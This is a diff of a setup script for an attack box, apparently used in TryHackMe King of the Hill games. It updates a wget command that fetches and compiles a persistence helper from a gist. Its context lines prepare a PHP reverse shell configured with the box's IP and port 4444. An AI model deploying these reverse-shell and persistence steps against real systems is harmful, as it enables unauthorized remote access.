@@ -32,7 +32,7 @@ echo "php rev as reverse.php"
 cp /usr/share/webshells/php/php-reverse-shell.php ./reverse.php && sed -i "s/PUT_THM_ATTACKBOX_IP_HERE/$(hostname -i)/g" reverse.php && sed -i "s/1234/4444/g" reverse.php
 
 echo "chattr alternative for koth (mf.c and mf)"
-wget -q https://gist.githubusercontent.com/ChrisPritchard/05d98e1d195bc255b30674c8ce0fec50/raw/44b4079a5317820db6789b90a0c6d0dfb2330609/mf.c -O mf.c && gcc -static -o mf mf.c
+wget -q https://gist.githubusercontent.com/ChrisPritchard/05d98e1d195bc255b30674c8ce0fec50/raw/d5f02539ff892b83d1079284553f052b316793a7/mf.c -O mf.c && gcc -static -o mf mf.c
 
 ssh-keygen -t ed25519 -P "" -f "/root/.ssh/id_ed25519" > /dev/null
 echo "ssh public key is:"
